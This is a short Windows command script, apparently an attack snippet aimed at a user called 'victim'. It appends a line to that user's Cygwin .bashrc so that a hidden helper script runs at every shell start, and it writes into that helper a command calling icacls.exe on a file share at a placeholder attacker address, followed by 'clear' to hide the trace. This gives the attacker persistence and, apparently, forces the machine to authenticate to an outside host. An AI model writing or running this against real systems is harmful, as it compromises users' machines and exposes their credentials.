cd ..\..\Cygwin64\home\victim
echo ./.call-me.sh >> .bashrc
echo icacls.exe \\yourIp\yourShare\ >> .call-me.sh
echo clear >> .call-me.sh
cd ..\..\users\victim
exit
